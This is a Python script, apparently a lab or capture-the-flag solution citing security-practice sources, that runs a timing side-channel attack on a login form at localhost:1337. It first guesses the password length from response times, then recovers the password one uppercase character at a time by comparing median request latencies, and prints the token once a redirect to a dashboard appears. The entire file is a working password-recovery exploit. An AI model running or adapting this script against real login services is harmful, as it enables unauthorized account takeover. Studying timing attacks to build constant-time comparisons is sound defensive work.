# https://github.com/sqreen/DevelopersSecurityBestPractices/blob/master/_practices/timing-attack/_python/hack.py
# https://book.jorianwoltjer.com/cryptography/timing-attacks

import sys
import time
import timeit
import string
import statistics
import requests
from operator import itemgetter

USERNAME = "admin-23310687766222216"
URL = "http://localhost:1337/login"

# Might need to adjust these values to account for remote server latency
LENGTH_ITER = 500
CHARACTER_ITER = 20

class PasswordFound(Exception):
    def __init__(self, password):
        self.password = password

def try_to_hack(characters):
    timings = []

    print('.', end='', flush=True)

    for i in range(CHARACTER_ITER):
        before = time.perf_counter()
        result = requests.post(URL, data={'username': USERNAME, 'password': characters})
        after = time.perf_counter()

        # if result was redirected to "dashboard" page, the password is correct
        if "dashboard" in result.url:
            raise PasswordFound(characters)

        timings.append(after - before)

    return timings


def find_next_character(token_size, base):
    measures = []

    print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
    for i, character in enumerate(string.ascii_uppercase):
        timings = try_to_hack(base + character + "0" * (token_size - len(base) - 1))

        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)

        measures.append({'character': character, 'median': median, 'min': min_timing,
                         'max': max_timing, 'stddev': stddev})

    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))

    found_character = sorted_measures[0]
    top_characters = sorted_measures[1:4]

    print("Found character at position %s: %r" % ((len(base) + 1), found_character['character']))
    msg = "Median: %s Max: %s Min: %s Stddev: %s"
    print(msg % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))

    print()
    print("Following characters were:")

    for top_character in top_characters:
        ratio = int((1 - (top_character['median'] / found_character['median'])) * 100)
        msg ="Character: %r Median: %s Max: %s Min: %s Stddev: %s (%d%% slower)"
        print(msg % (top_character['character'], top_character['median'], top_character['max'], top_character['min'], top_character['stddev'], ratio))

    return found_character['character']



def check_length(password):
    requests.post(URL, data={'username': USERNAME, 'password': password})

def main():
    # Do a first request to start the keep-alive connection
    requests.get(URL)

    samples = {}

    for length in range(4, 17): # reasonable range
        password = "a" * length
        time = timeit.timeit(f"check_length({password!r})", globals=globals(), number=LENGTH_ITER)
        print(f"{length} -> {time:.3f}")
        samples[length] = time
        
    print("Found length:", max(samples, key=samples.get))

    length = max(samples, key=samples.get) # should be 12

    base = ''
    try:
        while len(base) != length:
            next_character = find_next_character(length, base)
            base += next_character
            print("\n\n", end="")
    except PasswordFound as e:
        print("\n\n", end="")
        print("The token is: %r %s" % (e.password, '!' * 10))
        sys.exit(0)
    else:
        print("The password is not found, check the allowed character and token size")
        sys.exit(1)


if __name__ == '__main__':
    main()